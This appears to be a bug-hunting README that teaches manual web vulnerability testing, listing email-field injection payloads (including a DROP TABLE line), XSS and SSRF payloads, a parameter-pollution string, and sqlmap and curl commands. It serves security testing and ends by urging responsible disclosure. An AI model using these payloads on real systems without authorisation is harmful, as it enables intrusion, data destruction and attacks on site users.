# Bug Hunting Manual Testing

This README file provides a step-by-step guide on how to manually test for common web application vulnerabilities. Each section includes the payloads, testing methods, and tools you can use to identify security flaws in web applications.

## Table of Contents

1. [Email Address Payloads](#email-address-payloads)
2. [SQL Injection](#sql-injection)
3. [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
4. [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
5. [Parameter Pollution](#parameter-pollution)
6. [Tools & Methods for Testing](#tools--methods-for-testing)

---

## Email Address Payloads

Test if email inputs are vulnerable to template injection, SQL injection, or other forms of code injection. Use the following payloads for testing:

### Template Injection
- `"<%=7*7%>"@example.com`
- `test+(${{7*7}})@example.com`

### SQL Injection
- `"OR 1=1 --'"@example.com`
- `"Mail');DROP TABLE users;--"@example.com`

### XSS Injection in Email
- `test+(<script>alert(0)</script>)@example.com`
- `test@example.com(<script>alert(0)</script>).com`
- `"<script>alert(0)</script>"@example.com`

### Recommended Testing Steps:
1. Manually input the payloads into email fields on registration, login, or any other user input form.
2. Verify if the application processes these payloads and returns unexpected behavior, such as executing scripts or modifying queries.
3. In case of email-based vulnerabilities, check if the system sends malformed or unsafe emails that could affect users.

---

## SQL Injection

SQL Injection vulnerabilities occur when user input is directly included in SQL queries without proper sanitization. Use the following payloads to test:

### Payloads:
- `"OR 1=1 --'"@example.com`
- `"Mail');DROP TABLE users;--"@example.com`

### Recommended Testing Steps:
1. Identify input fields or URL parameters that might be vulnerable (e.g., login forms, search fields).
2. Test with basic SQL injection payloads like `' OR 1=1 --` to check if the application bypasses authentication.
3. Use `sqlmap` for more advanced exploitation:

```bash
sqlmap -u 'https://example.com/login.php?op=verify' --method POST --data="login=yourusername&password=yourpassword" --dbms=mysql --dbs --no-cast
```

---

## XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) allows an attacker to inject malicious scripts into webpages viewed by other users. The following payloads are designed to test for reflective and stored XSS vulnerabilities.

### Payloads:
1. `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
2. `"><svg/onload=alert(1)><img src=x onerror=alert(2) />`
3. `<script src="https://trustedsite.com/jsonp?callback=alert(1)"></script>`
4. `"><script%00>alert(1)</script>`
5. `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>`
6. `#"><img src=x onerror=alert(1)>`
7. `+ADw-SCRIPT+AD4-alert(1)+ADw-/SCRIPT+AD4-.`

### Recommended Testing Steps:
1. Inject payloads into input fields, URL parameters, or any areas that render user input.
2. Manually check for script execution in the browser.
3. Use **curl** for automated testing in the following way:

```bash
curl -G "http://target-site.com/vulnerable-page" --data-urlencode "param=<script>alert('XSS')</script>" -H "User-Agent: your-user-agent" -v
```

### Browser Testing:
- While `curl` is useful for automation, test XSS vulnerabilities in a real user environment by manually inspecting the application in your browser. Observe how different browsers react to XSS payloads.

---

## SSRF (Server-Side Request Forgery)

SSRF vulnerabilities occur when an attacker can make unauthorized requests from the server-side. Use the following payloads to test if the application allows SSRF:

### Payloads:
- `John.doe@abc123.burpcollaborator.net`
- `John.doe@[127.0.0.1]`

### Recommended Testing Steps:
1. Inject SSRF payloads into URL parameters or input fields that are intended for an email or URL.
2. Check if the server processes requests to internal resources like `localhost` or external resources like Burp Collaborator.
3. Observe if the server returns sensitive data or allows access to internal services.

---

## Parameter Pollution

Parameter pollution occurs when an attacker manipulates the input parameters, often to bypass security controls or inject additional data. The following payload can be used to test for parameter pollution:

### Payload:
- `victim&email=attacker@example.com`

### Recommended Testing Steps:
1. Try adding extra parameters to URL queries, especially in GET requests.
2. Check if the application processes these polluted parameters correctly and allows unauthorized actions (e.g., login as another user).
3. Review the application’s response to see if any internal validation is bypassed.

---

## Tools & Methods for Testing

### Recommended Tools:
1. **Burp Suite**: A powerful tool for intercepting HTTP requests and automating common attacks like SQL injection and XSS.
2. **sqlmap**: An automatic tool to test and exploit SQL injection vulnerabilities.
3. **Curl**: For automated testing, especially useful in testing XSS payloads and parameter manipulation.
4. **OWASP ZAP**: Another option for testing web application vulnerabilities, including XSS and SQL injection.

---

### Conclusion
Testing for common vulnerabilities is essential for identifying potential flaws in web applications. Always combine automated tools with manual testing to get the most accurate results. If you find any vulnerabilities, ensure to follow responsible disclosure practices.
